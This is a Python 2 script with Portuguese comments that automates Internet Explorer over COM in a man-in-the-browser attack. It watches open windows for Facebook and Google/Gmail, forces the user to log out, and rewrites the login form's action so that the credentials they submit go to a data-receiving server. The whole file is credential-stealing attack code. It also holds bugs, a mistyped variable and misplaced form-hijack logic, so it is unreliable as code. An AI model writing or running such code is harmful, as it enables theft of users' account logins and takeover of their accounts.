#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Sun Oct 13 07:38:26 2019

@author: max
"""

import win32com.client
import time
import urlparse
import urllib

data_receiver = 'http://localhost:8080/'

target_sites = {}
target_sites['www.facebook.com'] = {'logout_url':None,
            'logout_form':'logout_form',
            'login_form_index': 0,
            'owned':False}
target_sites['accounts.google.com'] = {
        'logout_url':'https://accounts.google.com/Logout?hl=en&continue=https://accounts.google.com/ServiceLogin%3Fservice%3Dmail',
        'logout_form':None,
        'login_form_index':0,
        'owned': False}

# Usa o mesmo alvo para vários domínios Gmail
target_sites['www.gmail.com'] = target_sites['accounts.google.com']
target_sites['mail.gmail.com'] = target_sites['accounts.google.com']

clsid = '{9BA05972-F6AB-11CF-A442-00A0C90ABF39}'

windows = win32com.client.Dispatch(clsid)

def wait_for_browser(browser):
    
    # Espera o navegador terminar de carregar uma página
    while browser.ReadyState != 4 and browser.ReadyState != 'complete':
        time.sleep(0.1)
        
    return


while True:
    
    for browser in windows:
    
        url = urlparse.urlparse(browser.LocationUrl)
        if url.hostname in target_sites:
            if target_sites[url.hostname]['owned']:
                continue
            
            # Se houver um URL, podemos simplesmente fazer o redirecionamento
            if target_sites[url.hostname]['logout_url']:
                browser.Navigate(target_sites[url.hostname]['logout_url'])
                wait_for_browser(browser)
            
            else:
                
                # Obtém todos os elementos dos documentos
                full_doc = browser.Document.all
                
                # Faz uma iteraçao, procurando o formulario de logout
                for i in full_doc:
                    
                    try:
                        
                        # Encontra o formyulario de logout e submete-o
                        if i.id == target_sites[url.hostname]['logout_form']:
                            i.submit()
                            wait_for_browser(browser)
                            
                    except:
                        pass
                
        # Agora modificaremos o formulário de login
        try:
            login_index = target_sites[url.hostname]['login_form_index']
            login_page = urllib.quote(browserLocationUrl)
            browser.Document.forms[login_index].action = '%s%s'%(data_receiver, login_page)
            target_sites[url.hostname]['owned'] = True
        
        except:
            pass
    
    time.sleep(5)
         
        